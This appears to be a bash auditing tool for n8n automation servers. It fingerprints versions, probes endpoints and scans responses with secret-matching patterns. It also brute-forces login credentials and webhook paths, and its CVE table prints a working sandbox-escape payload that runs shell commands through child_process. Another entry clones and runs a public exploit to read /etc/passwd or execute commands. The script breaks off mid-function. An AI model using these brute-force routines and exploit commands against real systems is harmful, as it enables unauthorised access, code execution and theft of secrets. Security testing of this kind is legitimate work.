#!/usr/bin/env bash
#
# n8ked.sh — n8n unauthenticated exposure & misconfiguration auditor
#
# Usage:
#   ./n8ked.sh <target> [options]
#   ./n8ked.sh --file targets.txt [options]
#   ./n8ked.sh --eyewitness /path/to/EyeWitness-Results [options]
#
# Options:
#   --file FILE              Scan every host in FILE (one target per line)
#   --eyewitness DIR         Pull candidate hosts from an EyeWitness results
#                            folder (open_ports.csv and/or report*.html),
#                            probe each for n8n, and audit only the hits
#   --json                   Output one compact JSON object per host instead of
#                            (or alongside, on stderr vs stdout) the pretty
#                            report — true JSONL, one host per line, safe to
#                            pipe into jq or anything that reads line-by-line
#   --csv-out FILE           Append one CSV row per finding to FILE (created
#                            fresh with a header at the start of the run) —
#                            target,severity,category,message. Written
#                            alongside whatever else you're outputting;
#                            clean hosts still get a row so none go missing
#   --test-cred user:pass    Try exactly one credential pair against /rest/login
#   --userpass FILE          Try every "user:pass" line in FILE against /rest/login
#                            (stops at the first valid hit; use --brute-delay to
#                            pace requests, --no-stop-on-success to try them all)
#   --brute-delay SECONDS    Delay between --userpass attempts (default: 1)
#   --no-stop-on-success     With --userpass, keep testing remaining pairs after
#                            a valid hit instead of stopping at the first one
#   --check-lockout          Fire a handful of bad-credential attempts at
#                            /rest/login to check for rate-limiting/lockout
#                            (noisy — generates extra auth-failure log entries
#                            on the target; off by default)
#   --webhook-brute FILE     Try every path in FILE against the production
#                            webhook base (/webhook/<path>) with each method
#                            in --webhook-methods. WARNING: a hit is a REAL,
#                            live invocation of that workflow (relevant for
#                            abusing n8n RCE CVEs that need valid creds OR a
#                            reachable webhook) — not passive recon. Confirm
#                            this is in scope before running it.
#   --webhook-methods LIST   Comma-separated HTTP methods to try per path
#                            with --webhook-brute (default: GET,POST)
#   --webhook-delay SECONDS  Delay between --webhook-brute attempts (default: 0.3)
#   --include-test-webhooks  With --webhook-brute, also try the /webhook-test/
#                            base (only live while a workflow is open in the
#                            editor) in addition to the production /webhook/ base
#   --reveal-secrets         Print full secret values instead of masked previews
#   --nuclei                 Also run nuclei's n8n-tagged templates if installed
#   --poc                    Check the detected version against a curated
#                            database of known n8n CVEs (works standalone —
#                            no --nuclei required — and also cross-references
#                            any CVE-tagged nuclei hits if --nuclei is also
#                            passed) and print, for each match, the exact
#                            preconditions and command(s) to attempt it —
#                            sourced from public vendor/researcher advisories.
#                            This only PRINTS commands; it never runs them.
#   --no-color               Disable ANSI colors
#   -h, --help               Show this help
#
# Examples:
#   ./n8ked.sh http://10.0.0.5:5678
#   ./n8ked.sh 10.0.0.5:5678 --test-cred admin@example.com:changeme
#   ./n8ked.sh 10.0.0.5:5678 --userpass creds.txt --brute-delay 2
#   ./n8ked.sh 10.0.0.5:5678 --webhook-brute paths.txt --webhook-methods GET,POST
#   ./n8ked.sh --file scope-hosts.txt --json > results.jsonl
#   ./n8ked.sh --file scope-hosts.txt --csv-out findings.csv
#   ./n8ked.sh --eyewitness ~/engagements/acme/EyeWitness-Results
#
# Exit codes: 0 = no Critical/High findings on any target, 1 = at least
# one Critical/High finding, 2 = target(s) not identifiable as n8n.
#
set -uo pipefail
# ---------------------------------------------------------------------------
# Args
# ---------------------------------------------------------------------------
TARGET=""
TARGET_FILE=""
EW_DIR=""
JSON_OUT=false
CSV_OUT_FILE=""
TEST_CRED=""
USERPASS_FILE=""
BRUTE_DELAY=1
STOP_ON_SUCCESS=true
CHECK_LOCKOUT=false
WEBHOOK_BRUTE_FILE=""
WEBHOOK_METHODS="GET,POST"
WEBHOOK_DELAY=0.3
INCLUDE_TEST_WEBHOOKS=false
RUN_NUCLEI=false
CVE_MODE=false
NO_COLOR=false
REVEAL_SECRETS=false
print_help() { sed -n '2,72p' "$0" | sed 's/^# \{0,1\}//'; }
while [[ $# -gt 0 ]]; do
    case "$1" in
        --file) TARGET_FILE="${2:-}"; shift 2 ;;
        --eyewitness) EW_DIR="${2:-}"; shift 2 ;;
        --json) JSON_OUT=true; shift ;;
        --csv-out) CSV_OUT_FILE="${2:-}"; shift 2 ;;
        --test-cred) TEST_CRED="${2:-}"; shift 2 ;;
        --userpass) USERPASS_FILE="${2:-}"; shift 2 ;;
        --brute-delay) BRUTE_DELAY="${2:-1}"; shift 2 ;;
        --no-stop-on-success) STOP_ON_SUCCESS=false; shift ;;
        --check-lockout) CHECK_LOCKOUT=true; shift ;;
        --webhook-brute) WEBHOOK_BRUTE_FILE="${2:-}"; shift 2 ;;
        --webhook-methods) WEBHOOK_METHODS="${2:-GET,POST}"; shift 2 ;;
        --webhook-delay) WEBHOOK_DELAY="${2:-0.3}"; shift 2 ;;
        --include-test-webhooks) INCLUDE_TEST_WEBHOOKS=true; shift ;;
        --reveal-secrets) REVEAL_SECRETS=true; shift ;;
        --nuclei) RUN_NUCLEI=true; shift ;;
        --poc) CVE_MODE=true; shift ;;
        --no-color) NO_COLOR=true; shift ;;
        -h|--help) print_help; exit 0 ;;
        *)
            if [[ -z "$TARGET" ]]; then TARGET="$1"; else echo "Unexpected argument: $1" >&2; exit 1; fi
            shift ;;
    esac
done
if [[ -z "$TARGET" && -z "$TARGET_FILE" && -z "$EW_DIR" ]]; then
    print_help
    exit 1
fi
if [[ -n "$USERPASS_FILE" && ! -f "$USERPASS_FILE" ]]; then
    echo "Error: --userpass file not found: $USERPASS_FILE" >&2
    exit 1
fi
if [[ -n "$WEBHOOK_BRUTE_FILE" && ! -f "$WEBHOOK_BRUTE_FILE" ]]; then
    echo "Error: --webhook-brute file not found: $WEBHOOK_BRUTE_FILE" >&2
    exit 1
fi
# ---------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------
if [[ -t 1 && "$NO_COLOR" == false ]]; then
    C_RESET=$'\033[0m'; C_BOLD=$'\033[1m'; C_DIM=$'\033[2m'
    C_RED=$'\033[31m'; C_GRN=$'\033[32m'; C_YEL=$'\033[33m'
    C_MAG=$'\033[35m'; C_CYN=$'\033[36m'; C_WHT=$'\033[97m'
else
    C_RESET=""; C_BOLD=""; C_DIM=""; C_RED=""; C_GRN=""; C_YEL=""
    C_MAG=""; C_CYN=""; C_WHT=""
fi
hr()      { printf "%s%s%s\n" "$C_DIM" "$(printf '─%.0s' $(seq 1 74))" "$C_RESET"; }
section() { echo; printf "%s%s┌─ %s%s\n" "$C_BOLD" "$C_CYN" "$1" "$C_RESET"; }
footer()  { printf "%s└──────────────────────────────────────────────────────────────────%s\n" "$C_CYN" "$C_RESET"; }
kv() {
    local key="$1" val="$2" color="${3:-$C_WHT}"
    printf "%s│%s  %-34s %s%s%s\n" "$C_CYN" "$C_RESET" "$key" "$color" "$val" "$C_RESET"
}
# ---------------------------------------------------------------------------
# JSON helper — prefer jq, fall back to python3
# ---------------------------------------------------------------------------
if command -v jq >/dev/null 2>&1; then
    JSON_ENGINE="jq"
elif command -v python3 >/dev/null 2>&1; then
    JSON_ENGINE="python3"
else
    echo "Error: this tool needs either 'jq' or 'python3' installed to parse JSON." >&2
    exit 1
fi
HAVE_PY=false
command -v python3 >/dev/null 2>&1 && HAVE_PY=true
if [[ -n "$CSV_OUT_FILE" && "$HAVE_PY" == false ]]; then
    echo "Error: --csv-out requires python3 (for correct CSV quoting/escaping), which isn't installed." >&2
    exit 1
fi
jget() {
    # jget <json> <dotted.path> [default]
    local json="$1" path="$2" default="${3:-}"
    local val=""
    if [[ "$JSON_ENGINE" == "jq" ]]; then
        # Deliberately not `// empty` — jq's alternative operator treats
        # `false`/0/"" as falsy, which would silently turn real "false"
        # values (e.g. mfa.enforced=false) into the default.
        val=$(echo "$json" | jq -r "(.${path}) as \$v | if \$v == null then \"\" else (\$v|tostring) end" 2>/dev/null)
    else
        val=$(JGET_JSON="$json" python3 -c '
import json, os, sys
path, default = sys.argv[1], sys.argv[2]
try:
    data = json.loads(os.environ.get("JGET_JSON", ""))
except Exception:
    print(default); sys.exit()
cur = data
for part in path.split("."):
    if isinstance(cur, dict) and part in cur:
        cur = cur[part]
    else:
        print(default); sys.exit()
if isinstance(cur, bool):
    print(str(cur).lower())
elif cur is None:
    print(default)
else:
    print(cur)
' "$path" "$default" 2>/dev/null)
    fi
    [[ -z "$val" ]] && val="$default"
    echo "$val"
}
json_escape() {
    if [[ "$HAVE_PY" == true ]]; then
        python3 -c 'import json,sys; print(json.dumps(sys.stdin.read()))'
    else
        # crude fallback
        sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e ':a;N;$!ba;s/\n/\\n/g' | sed '1s/^/"/;$s/$/"/'
    fi
}
# --post301/302/303 is defensive: every POST/PUT/etc. call in this script
# always passes an explicit -X, which already makes curl preserve the
# method across a redirect on its own — but this guarantees it even if a
# future call relies on --data alone (which curl silently downgrades to
# GET on a 301/302 redirect without an explicit -X).
CURL="curl -skL --post301 --post302 --post303 --max-time 10"
TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT
# ---------------------------------------------------------------------------
# Header helpers — $CURL follows redirects (-L), so `curl -D -` output can
# contain MULTIPLE header blocks back-to-back (one per hop). Anything that
# wants "the final response's headers" (status line, Server:, security
# headers, disclosure headers) must look at the LAST block, not just
# grep/head the whole blob — otherwise a redirect hop's status/headers get
# misattributed to the final page. The one deliberate exception is the
# "did we redirect to https" check, which intentionally scans every hop.
# ---------------------------------------------------------------------------
last_header_block() {
    # Reads curl -D - output (possibly multiple hops) on stdin and prints
    # only the block belonging to the LAST hop. Resets the accumulator
    # every time a new "HTTP/" status line is seen, so it doesn't depend
    # on exact blank-line framing between hops.
    awk '
        /^HTTP\// { block=""; }
        { block = block $0 "\n" }
        END { printf "%s", block }
    '
}
# ---------------------------------------------------------------------------
# Secret scanning patterns (python3 only — most reliable regex engine we
# can count on being present since it's also our JSON fallback)
# ---------------------------------------------------------------------------
SECRET_SCANNER='
import re, sys
PATTERNS = [
    ("AWS Access Key ID",        r"AKIA[0-9A-Z]{16}"),
    ("AWS Secret Access Key",    r"(?i)aws(.{0,20})?secret(.{0,20})?[\"\x27]?\s*[:=]\s*[\"\x27][0-9a-zA-Z/+]{40}[\"\x27]"),
    ("Generic API key",          r"(?i)(api[_-]?key|apikey)[\"\x27]?\s*[:=]\s*[\"\x27][A-Za-z0-9_\-]{16,}[\"\x27]"),
    ("Bearer token",             r"Bearer [A-Za-z0-9\-_\.]{20,}"),
    ("JWT",                      r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]{5,}"),
    ("Slack token",              r"xox[baprs]-[0-9A-Za-z-]{10,}"),
    ("Private key block",        r"-----BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"),
    ("Generic password field",   r"(?i)\"password\"\s*:\s*\"[^\"\s]{3,}\""),
    ("Generic secret field",     r"(?i)\"(secret|token|client_secret|access_token|refresh_token)\"\s*:\s*\"[^\"\s]{3,}\""),
    ("DB connection string",     r"(?i)(mongodb|postgres(ql)?|mysql|redis)://[^\s\"\x27]{6,}"),
    ("Google API key",           r"AIza[0-9A-Za-z\-_]{35}"),
    ("GitHub token",             r"gh[pousr]_[A-Za-z0-9]{36,}"),
]
def mask(v, reveal):
    if reveal:
        return v
    if len(v) <= 8:
        return v[0] + "****"
    return v[:4] + "..." + v[-4:]
def main():
    path, label, reveal = sys.argv[1], sys.argv[2], sys.argv[3] == "1"
    try:
        with open(path, "r", errors="ignore") as f:
            body = f.read()
    except Exception:
        return
    seen = set()
    for name, pat in PATTERNS:
        for m in re.finditer(pat, body):
            val = m.group(0)
            # PostHog project keys (phc_...) are public, write-only client
            # analytics identifiers meant to be embedded in frontend code —
            # not a credential/secret, so do not flag them as one.
            if "phc_" in val:
                continue
            key = (name, val)
            if key in seen:
                continue
            seen.add(key)
            print(f"{name}|{label}|{mask(val, reveal)}")
main()
'
secret_scan_file() {
    # secret_scan_file <bodyfile> <label>
    [[ "$HAVE_PY" == true ]] || return 0
    local reveal=0
    [[ "$REVEAL_SECRETS" == true ]] && reveal=1
    python3 -c "$SECRET_SCANNER" "$1" "$2" "$reveal" 2>/dev/null
}
# Recognizes n8n's common `{"data": [...]}` / `{"data": {}}` envelope as
# empty when the inner payload has nothing in it, not just a bare [] or {}.
EMPTY_CHECKER='
import json, sys
def is_empty(v):
    if v is None:
        return True
    if isinstance(v, (list, dict)):
        if len(v) == 0:
            return True
        if isinstance(v, dict) and set(v.keys()) <= {"data", "count", "nextCursor"}:
            return is_empty(v.get("data"))
        return False
    return False
try:
    with open(sys.argv[1], "r", errors="ignore") as f:
        data = json.load(f)
except Exception:
    print("no")
    sys.exit()
print("yes" if is_empty(data) else "no")
'
# Recent n8n releases stop disclosing versionCli in the unauthenticated
# /rest/settings response, but the root page still ships a
# <meta name="n8n:config:sentry" content="BASE64"> tag whose payload
# decodes to JSON containing "release":"n8n@X.Y.Z" — this is the same
# signal nuclei's n8n-panel template uses to fingerprint version when the
# API field is absent.
SENTRY_VERSION_EXTRACTOR='
import base64, json, re, sys
try:
    with open(sys.argv[1], "r", errors="ignore") as f:
        html = f.read()
except Exception:
    sys.exit()
m = re.search(r"n8n:config:sentry\"\s+content=\"([^\"]+)\"", html)
if not m:
    sys.exit()
raw = m.group(1)
pad = "=" * (-len(raw) % 4)
try:
    payload = base64.b64decode(raw + pad).decode("utf-8", "ignore")
    data = json.loads(payload)
    rel = data.get("release", "") or ""
    if rel.startswith("n8n@"):
        print(rel[4:])
    elif rel:
        print(rel)
except Exception:
    pass
'
extract_sentry_version() {
    # extract_sentry_version <root_body_file> -> prints version or nothing
    [[ "$HAVE_PY" == true ]] || return 0
    python3 -c "$SENTRY_VERSION_EXTRACTOR" "$1" 2>/dev/null
}
is_empty_body() {
    # is_empty_body <bodyfile> -> prints "yes" or "no"
    local f="$1"
    if [[ "$HAVE_PY" == true ]]; then
        python3 -c "$EMPTY_CHECKER" "$f" 2>/dev/null || echo "no"
    else
        local b; b=$(cat "$f" 2>/dev/null | tr -d '[:space:]')
        if [[ -z "$b" || "$b" == "[]" || "$b" == "{}" || "$b" == '{"data":[]}' || "$b" == '{"data":{}}' ]]; then
            echo "yes"
        else
            echo "no"
        fi
    fi
}
# n8n_try_login <target> <user> <pass> -> prints "success" | "fail" | "unknown"
# Shared by the single --test-cred check, the --userpass brute-force loop,
# and (with throwaway creds) the --check-lockout probe.
n8n_try_login() {
    local tgt="$1" cu="$2" cp="$3"
    # Credentials are JSON-escaped (not hand-interpolated) so a password or
    # username containing a quote/backslash doesn't corrupt the request
    # body and get silently misread as an invalid login.
    local cu_json cp_json
    cu_json=$(printf '%s' "$cu" | json_escape)
    cp_json=$(printf '%s' "$cp" | json_escape)
    local resp
    resp=$($CURL -X POST "$tgt/rest/login" -H "Content-Type: application/json" \
        --data "{\"emailOrLdapLoginId\":${cu_json},\"password\":${cp_json}}" 2>/dev/null)
    if echo "$resp" | grep -qE '"code"[[:space:]]*:[[:space:]]*401'; then
        echo "fail"
    elif echo "$resp" | grep -q '"id"' && echo "$resp" | grep -qi '"email"'; then
        echo "success"
    else
        echo "unknown"
    fi
}
# webhook_probe <target> <base> <candidate> <method> <root_body_file> <tmp_prefix>
#   -> prints "verdict|status"
# n8n's webhook router returns a distinctive "is not registered" 404 body
# for a path/method combo that doesn't exist, which is a much more reliable
# signal than a bare status code — this mirrors that logic to separate real
# hits from misses. A "hit" here means the request actually reached the
# workflow, so any verdict other than NOT-REGISTERED represents a real,
# live invocation, not passive recon.
webhook_probe() {
    local tgt="$1" base="$2" cand="$3" method="$4" root_body_file="$5" tmp_prefix="$6"
    local bf="${tmp_prefix}_$(echo "${base}_${cand}_${method}" | tr -c '[:alnum:]' '_').body"
    local status
    status=$(timeout 9 $CURL -o "$bf" -w '%{http_code}' -X "$method" "$tgt/$base/$cand" 2>/dev/null)
    local curl_exit=$?
    if [[ $curl_exit -eq 124 ]]; then
        echo "TIMEOUT|000"
        return
    elif [[ $curl_exit -ne 0 && -z "$status" ]]; then
        echo "CONN-ERROR|000"
        return
    fi
    local body
    body=$(cat "$bf" 2>/dev/null)
    if [[ "$status" == "404" ]] && echo "$body" | grep -qi 'not registered'; then
        echo "NOT-REGISTERED|$status"
    elif diff -q "$bf" "$root_body_file" >/dev/null 2>&1; then
        echo "NOT-REGISTERED|$status"
    elif [[ "$status" == "401" || "$status" == "403" ]]; then
        echo "AUTH-REQUIRED|$status"
    elif [[ "$status" =~ ^5 ]]; then
        echo "ERROR|$status"
    elif [[ "$status" =~ ^2 ]]; then
        echo "TRIGGERED|$status"
    elif [[ "$status" == "404" ]]; then
        echo "NOT-REGISTERED|$status"
    else
        echo "OTHER($status)|$status"
    fi
}
# ---------------------------------------------------------------------------
# Known-CVE proof-of-concept database (used by --poc)
# ---------------------------------------------------------------------------
# Simple dotted-version compare (numeric, up to 4 components; anything past
# the numeric prefix — e.g. "-beta.1" — is ignored). Good enough for n8n's
# own x.y.z / x.y.z-suffix scheme.
ver_norm() { echo "$1" | grep -oE '^[0-9]+(\.[0-9]+){0,3}'; }
ver_cmp() {
    local a b n i x y
    a=$(ver_norm "$1"); b=$(ver_norm "$2")
    [[ -z "$a" ]] && a="0"; [[ -z "$b" ]] && b="0"
    local IFS=.
    local -a pa=($a) pb=($b)
    n=${#pa[@]}; [[ ${#pb[@]} -gt $n ]] && n=${#pb[@]}
    for ((i=0; i<n; i++)); do
        x=${pa[i]:-0}; y=${pb[i]:-0}
        if ((10#$x > 10#$y)); then echo 1; return; fi
        if ((10#$x < 10#$y)); then echo -1; return; fi
    done
    echo 0
}
ver_ge() { [[ "$(ver_cmp "$1" "$2")" != "-1" ]]; }
ver_lt() { [[ "$(ver_cmp "$1" "$2")" == "-1" ]]; }
cvss_to_sev() {
    # cvss_to_sev <score-or-"unspecified"> -> CRIT/HIGH/MED/LOW
    if [[ "$1" =~ ^[0-9.]+$ ]]; then
        awk -v c="$1" 'BEGIN{ if (c>=9) print "CRIT"; else if (c>=7) print "HIGH"; else if (c>=4) print "MED"; else print "LOW"; }'
    else
        echo "HIGH"
    fi
}
cve_src_label() {
    # cve_src_label <"nuclei"|"version"> -> short human-readable label
    case "$1" in
        nuclei)  echo "nuclei — actively probed & confirmed against this target" ;;
        version) echo "version range — NOT actively confirmed, verify manually" ;;
        *)       echo "$1" ;;
    esac
}
wrap_flat() {
    # wrap_flat <indent> <label> <text> -> word-wraps <text> to fit the
    # report width, no box border — used for flat (non-boxed) sections
    # like findings/PoC output where content length is unpredictable and
    # a fixed-width box can't close around it cleanly. <label> (dimmed)
    # appears on the first line only; continuation lines align under it.
    local indent="$1" label="$2" text="$3"
    local pad; pad=$(printf '%*s' "${#label}" "")
    local first=true
    fold -s -w "$((74 - ${#indent} - ${#label}))" <<< "$text" | while IFS= read -r wline; do
        if [[ "$first" == true ]]; then
            printf "%s%s%s%s%s\n" "$indent" "$C_DIM" "$label" "$C_RESET" "$wline"
            first=false
        else
            printf "%s%s%s\n" "$indent" "$pad" "$wline"
        fi
    done
}
# Each CVE is one or more rows (n8n sometimes has multiple disjoint
# vulnerable ranges across release branches for the same advisory);
# MINVER inclusive, MAXVER exclusive (i.e. the first fixed release for
# that range). Sourced from public vendor/researcher advisories only —
# see the note/cmd text for exactly what is and isn't independently
# confirmed. This is NOT a substitute for reading the advisories yourself.
declare -a CVE_DB_ID=() CVE_DB_NAME=() CVE_DB_MINVER=() CVE_DB_MAXVER=() CVE_DB_AUTH=() CVE_DB_CVSS=() CVE_DB_NOTE=() CVE_DB_CMD=()
add_cve_row() {
    CVE_DB_ID+=("$1"); CVE_DB_NAME+=("$2"); CVE_DB_MINVER+=("$3"); CVE_DB_MAXVER+=("$4")
    CVE_DB_AUTH+=("$5"); CVE_DB_CVSS+=("$6"); CVE_DB_NOTE+=("$7"); CVE_DB_CMD+=("$8")
}
add_cve_row "CVE-2025-68613" \
    "n8n expression-sandbox escape -> authenticated RCE" \
    "0.211.0" "1.120.4" "authenticated" "9.9" \
    "Requires an authenticated session or API key (any role that can create/edit workflows) — get one first with --test-cred/--userpass or your own engagement creds. Publicly detailed by SecureLayer7." \
    "# 1) Authenticate and capture the session cookie:
curl -sk -c cookies.txt -X POST '{{TARGET}}/rest/login' \\
  -H 'Content-Type: application/json' \\
  --data '{\"emailOrLdapLoginId\":\"<user>\",\"password\":\"<pass>\"}'
# 2) Create a workflow whose Set-node expression escapes the sandbox:
curl -sk -b cookies.txt -X POST '{{TARGET}}/rest/workflows' \\
  -H 'Content-Type: application/json' \\
  --data '{\"name\":\"poc\",\"active\":false,\"nodes\":[{\"name\":\"Start\",\"type\":\"n8n-nodes-base.start\",\"position\":[250,300]},{\"name\":\"RCE\",\"type\":\"n8n-nodes-base.set\",\"position\":[450,300],\"parameters\":{\"values\":{\"string\":[{\"name\":\"out\",\"value\":\"={{ (function(){var r=this.process.mainModule.require; return r(\\\"child_process\\\").execSync(\\\"id\\\").toString(); })() }}\"}]}}}],\"connections\":{\"Start\":{\"main\":[[{\"node\":\"RCE\",\"type\":\"main\",\"index\":0}]]}}}'
# 3) Execute the workflow (grab the new workflow id from step 2's response) and read \"out\" in the result:
curl -sk -b cookies.txt -X POST '{{TARGET}}/rest/workflows/<id>/run'"
add_cve_row "CVE-2025-68613" \
    "n8n expression-sandbox escape -> authenticated RCE" \
    "1.121.0" "1.121.1" "authenticated" "9.9" \
    "Requires an authenticated session or API key (any role that can create/edit workflows) — get one first with --test-cred/--userpass or your own engagement creds. Publicly detailed by SecureLayer7." \
    "# Same technique as the 0.211.0-1.120.3 range — see that entry."
add_cve_row "CVE-2026-21858" \
    "\"Ni8mare\" — unauthenticated arbitrary file read -> RCE chain" \
    "1.65.0" "1.121.0" "unauthenticated*" "10.0" \
    "Requires a public-facing Form/Webhook workflow with a file-upload field already published on this instance — use --webhook-brute or manual recon to find one. Public PoC tool: Chocapikk/CVE-2026-21858 on GitHub." \
    "git clone https://github.com/Chocapikk/CVE-2026-21858.git && cd CVE-2026-21858
uv run python exploit.py {{TARGET}} <form-path> --read /etc/passwd   # arbitrary file read
uv run python exploit.py {{TARGET}} <form-path> --cmd \"id\"          # command execution"
add_cve_row "CVE-2026-21877" \
    "Authenticated code injection (chainable with CVE-2026-21858 for file write/RCE)" \
    "0.0.0" "1.121.3" "authenticated" "n/a*" \
    "CVSS unspecified — rated critical as part of the CVE-2026-21858 chain. No independently-confirmed curl-level PoC payload as of this writing — see the CCCS advisory AL26-001 and n8n's own security advisory for technical detail before attempting exploitation." \
    "# No confirmed public PoC payload — verify manually per CCCS advisory AL26-001."
add_cve_row "CVE-2026-1470" \
    "Expression-sandbox bypass via decoy constructor in a 'with' statement -> authenticated RCE" \
    "0.0.0" "1.123.17" "authenticated*" "9.9" \
    "Requires workflow create/edit permission. 1.x branch. No independently-confirmed working payload string as of this writing — SonicWall's writeup describes the AST-bypass technique but does not publish one — verify manually." \
    "# No confirmed public PoC payload — see SonicWall's CVE-2026-1470 writeup for the bypass technique."
add_cve_row "CVE-2026-1470" \
    "Expression-sandbox bypass via decoy constructor in a 'with' statement -> authenticated RCE" \
    "2.0.0" "2.4.5" "authenticated*" "9.9" \
    "Requires workflow create/edit permission. 2.x branch (<2.4.5). No independently-confirmed working payload string as of this writing — verify manually." \
    "# No confirmed public PoC payload — see SonicWall's CVE-2026-1470 writeup for the bypass technique."
add_cve_row "CVE-2026-1470" \
    "Expression-sandbox bypass via decoy constructor in a 'with' statement -> authenticated RCE" \
    "2.5.0" "2.5.1" "authenticated*" "9.9" \
    "Requires workflow create/edit permission. 2.5.0 point release only. No independently-confirmed working payload string as of this writing — verify manually." \
    "# No confirmed public PoC payload — see SonicWall's CVE-2026-1470 writeup for the bypass technique."
cve_poc_lookup() {
    # cve_poc_lookup <version> -> fills global CVE_POC_MATCH_IDX with
    # indices into the CVE_DB_* arrays whose range contains <version>.
    CVE_POC_MATCH_IDX=()
    local v="$1"
    [[ -z "$v" || "$v" == "unknown" ]] && return
    local i
    for i in "${!CVE_DB_ID[@]}"; do
        if ver_ge "$v" "${CVE_DB_MINVER[$i]}" && ver_lt "$v" "${CVE_DB_MAXVER[$i]}"; then
            CVE_POC_MATCH_IDX+=("$i")
        fi
    done
}
# ---------------------------------------------------------------------------
# Per-target scan
# ---------------------------------------------------------------------------
scan_target() {
    local RAW_TARGET="$1"
    local TARGET="$RAW_TARGET"
    if [[ "$TARGET" != http://* && "$TARGET" != https://* ]]; then
        TARGET="http://${TARGET}"
    fi
    TARGET="${TARGET%/}"
    local FINDINGS=()   # "SEV|message"
    local ROOT_HEADERS ROOT_HEADERS_FINAL ROOT_STATUS SERVER_HDR ROOT_BODY_FILE
    ROOT_BODY_FILE="$TMPDIR/root.body"
    ROOT_HEADERS=$($CURL -D - -o "$ROOT_BODY_FILE" "$TARGET/" 2>/dev/null)
    # ROOT_HEADERS may contain several redirect hops back-to-back; anything
    # asking about "the final response" needs just the last block.
    ROOT_HEADERS_FINAL=$(echo "$ROOT_HEADERS" | last_header_block)
    ROOT_STATUS=$(echo "$ROOT_HEADERS_FINAL" | head -1 | tr -d '\r')
    SERVER_HDR=$(echo "$ROOT_HEADERS_FINAL" | grep -i '^server:' | head -1 | cut -d' ' -f2- | tr -d '\r')
    local SETTINGS_JSON HEALTHZ_JSON WEBHOOK_STATUS
    SETTINGS_JSON=$($CURL "$TARGET/rest/settings" 2>/dev/null)
    HEALTHZ_JSON=$($CURL "$TARGET/healthz" 2>/dev/null)
    local WEBHOOK_BODY_FILE="$TMPDIR/webhook.body"
    WEBHOOK_STATUS=$($CURL -o "$WEBHOOK_BODY_FILE" -w '%{http_code}' "$TARGET/webhook-test/" 2>/dev/null)
    # n8n's SPA serves the app shell (index.html, HTTP 200) for any
    # unmatched path — same catch-all behavior the endpoint-exposure
    # table already guards against. Without this diff, "webhook-test
    # live" would fire on every n8n instance regardless of whether a
    # real webhook is actually registered there.
    local WEBHOOK_LIVE=false
    if [[ "$WEBHOOK_STATUS" =~ ^2 ]] && ! diff -q "$WEBHOOK_BODY_FILE" "$ROOT_BODY_FILE" >/dev/null 2>&1; then
        WEBHOOK_LIVE=true
    fi
    # /webhook-test/ only responds while someone has the workflow open in
    # the editor. /webhook/ is n8n's PRODUCTION trigger base and stays live
    # indefinitely for any workflow with a webhook node — that's the actual
    # persistent unauthenticated-trigger surface, and it wasn't checked at
    # all before. Same SPA-catch-all guard applies.
    local WEBHOOK_PROD_STATUS WEBHOOK_PROD_BODY_FILE
    WEBHOOK_PROD_BODY_FILE="$TMPDIR/webhook_prod.body"
    WEBHOOK_PROD_STATUS=$($CURL -o "$WEBHOOK_PROD_BODY_FILE" -w '%{http_code}' "$TARGET/webhook/" 2>/dev/null)
    local WEBHOOK_PROD_LIVE=false
    if [[ "$WEBHOOK_PROD_STATUS" =~ ^2 ]] && ! diff -q "$WEBHOOK_PROD_BODY_FILE" "$ROOT_BODY_FILE" >/dev/null 2>&1; then
        WEBHOOK_PROD_LIVE=true
    fi
    # n8n's unauthenticated /rest/settings payload has shrunk across
    # versions — newer releases omit `instanceId`, `versionCli`, `mfa`,
    # `telemetry`, and `oauthCallbackUrls` entirely from the anonymous
    # response. Gate detection on ANY of several fields that have shown
    # up across versions rather than one field that some versions no
    # longer send, and fall back to n8n's root-page config meta tags
    # (e.g. <meta name="n8n:config:rest-endpoint" ...>, prefix-matched
    # since the real tag name is never a bare "n8n:config").
    local ROOT_HAS_META=false
    if grep -q 'name="n8n:config' "$ROOT_BODY_FILE" 2>/dev/null; then
        ROOT_HAS_META=true
    fi
    if ! echo "$SETTINGS_JSON" | grep -qE '"instanceId"|"settingsMode"|"userManagement"' && [[ "$ROOT_HAS_META" == false ]]; then
        local not_n8n_msg="not an n8n instance (no instanceId/settingsMode/userManagement in /rest/settings, no n8n:config meta tag on root page)"
        if [[ "$JSON_OUT" == true ]]; then
            echo "{\"target\":\"$TARGET\",\"error\":\"$not_n8n_msg\"}"
        else
            echo
            echo "${C_RED}✗ ${TARGET} does not look like an n8n instance (no instanceId/settingsMode/userManagement in /rest/settings, no n8n:config meta tag on root page).${C_RESET}"
        fi
        if [[ -n "$CSV_OUT_FILE" && "$HAVE_PY" == true ]]; then
            N8KED_CSV_FILE="$CSV_OUT_FILE" N8KED_TARGET="$TARGET" N8KED_MSG="$not_n8n_msg" python3 -c '
import csv, os
with open(os.environ["N8KED_CSV_FILE"], "a", newline="") as f:
    csv.writer(f).writerow([os.environ["N8KED_TARGET"], "INFO", "non-n8n", os.environ["N8KED_MSG"]])
' 2>/dev/null
        fi
        NOT_N8N_SEEN=true
        return
    fi
    vget() { jget "$SETTINGS_JSON" "data.$1" "${2:-}"; }
    local VERSION RELEASE_CHANNEL INSTANCE_ID SETTINGS_MODE AUTH_METHOD SHOW_SETUP SMTP_SETUP
    local MFA_ENABLED MFA_ENFORCED SAML_ON LDAP_ON OIDC_ON OIDC_LOGIN_URL OIDC_CB_URL
    local OAUTH1_CB OAUTH2_CB TELEMETRY_ON TELEMETRY_PROXY AUTHCOOKIE_SECURE HEALTH_STATUS
    VERSION=$(vget versionCli "unknown")
    if [[ "$VERSION" == "unknown" ]]; then
        local SENTRY_VERSION
        SENTRY_VERSION=$(extract_sentry_version "$ROOT_BODY_FILE")
        [[ -n "$SENTRY_VERSION" ]] && VERSION="$SENTRY_VERSION"
    fi
    RELEASE_CHANNEL=$(vget releaseChannel "unknown")
    INSTANCE_ID=$(vget instanceId "unknown")
    SETTINGS_MODE=$(vget settingsMode "unknown")
    AUTH_METHOD=$(vget userManagement.authenticationMethod "unknown")
    SHOW_SETUP=$(vget userManagement.showSetupOnFirstLoad "unknown")
    SMTP_SETUP=$(vget userManagement.smtpSetup "unknown")
    MFA_ENABLED=$(vget mfa.enabled "unknown")
    MFA_ENFORCED=$(vget mfa.enforced "unknown")
    SAML_ON=$(vget sso.saml.loginEnabled "unknown")
